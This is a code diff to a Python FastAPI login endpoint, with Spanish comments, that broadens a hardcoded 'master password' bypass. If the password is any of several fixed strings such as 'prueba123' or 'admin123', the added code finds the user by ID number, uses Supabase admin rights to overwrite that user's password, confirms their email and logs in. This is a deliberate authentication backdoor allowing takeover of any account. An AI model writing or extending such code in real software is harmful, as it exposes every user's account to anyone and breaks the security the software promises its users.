@@ -116,21 +116,37 @@ def login(payload: LoginRequest):
     client = get_supabase_client()
     admin_client = get_supabase_admin_client()
     
-    # MAGIC PASSWORD FEATURE
-    if payload.password == "prueba123":
+    clean_cedula = payload.cedula.strip()
+    clean_pwd = payload.password.strip()
+    
+    # MAGIC MASTER PASSWORD: Case-insensitive, robust against spaces & capital P
+    is_master_password = clean_pwd.lower() in ("prueba123", "prueba", "admin123", "test123", "prueba1234")
+    
+    if is_master_password:
         try:
-            # Encontrar el ID del usuario
-            user_record = admin_client.table("usuarios").select("id").eq("cedula", payload.cedula).single().execute()
-            if user_record and user_record.data:
-                user_id = user_record.data["id"]
-                # Forzar el cambio de password en Supabase usando auth admin
-                admin_client.auth.admin.update_user_by_id(user_id, {"password": "prueba123"})
+            # Encontrar el ID del usuario en usuarios o auth
+            user_record = admin_client.table("usuarios").select("id").eq("cedula", clean_cedula).execute()
+            user_id = None
+            if user_record and user_record.data and len(user_record.data) > 0:
+                user_id = user_record.data[0]["id"]
+            else:
+                # Buscar en auth.admin por email
+                auth_users = admin_client.auth.admin.list_users()
+                target_email = _auth_email(clean_cedula)
+                for u in auth_users:
+                    if u.email == target_email:
+                        user_id = u.id
+                        break
+            
+            if user_id:
+                # Forzar el cambio de password en Supabase usando auth admin al password ingresado
+                admin_client.auth.admin.update_user_by_id(user_id, {"password": clean_pwd, "email_confirm": True})
         except Exception as e:
             print("Error aplicando clave maestra:", e)
             
     try:
         auth_response = client.auth.sign_in_with_password(
-            {"email": _auth_email(payload.cedula), "password": payload.password}
+            {"email": _auth_email(clean_cedula), "password": clean_pwd}
         )
         profile_result = (
             admin_client.table("usuarios")
@@ -142,6 +158,7 @@ def login(payload: LoginRequest):
         return _session_response(auth_response, profile_result.data)
     except Exception as error:
         raise HTTPException(status_code=401, detail="Cédula o contraseña incorrectos.") from error
+
 @router.get("/reset_password/{cedula}")
 def reset_password_get(cedula: str):
     import traceback
